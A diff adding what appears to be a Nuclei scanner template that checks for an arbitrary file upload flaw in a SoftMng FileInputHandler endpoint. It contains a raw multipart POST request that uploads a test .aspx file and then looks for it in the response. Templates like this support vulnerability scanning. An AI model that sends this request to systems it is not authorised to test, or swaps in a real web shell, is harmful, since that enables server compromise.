@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - type: word
+          words:
+            - QAZWSX.aspx
+      matchers-condition: and
+      raw:
+        - |
+          POST /SoftMng/FileInputHandler/Upload HTTP/1.1
+          Host: {{Hostname}}
+          Accept: */*
+          Accept-Encoding: gzip, deflate
+          Connection: keep-alive
+          Content-Length: 211
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+          User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+          ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+          Content-Disposition: form-data; name="file"; filename="QAZWSX.aspx"
+          Content-Type: application/octet-stream
+
+          123456
+          ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+id: softmng-fileinputhandler-upload
+info:
+    author: ProjectDiscoveryAI
+    description: |
+        Exploits an arbitrary file upload vulnerability in the SoftMng FileInputHandler endpoint, allowing remote attackers to upload malicious files.
+    name: SoftMng FileInputHandler Arbitrary File Upload
+    severity: high
+    tags:
+        - file-upload
+        - arbitrary-upload
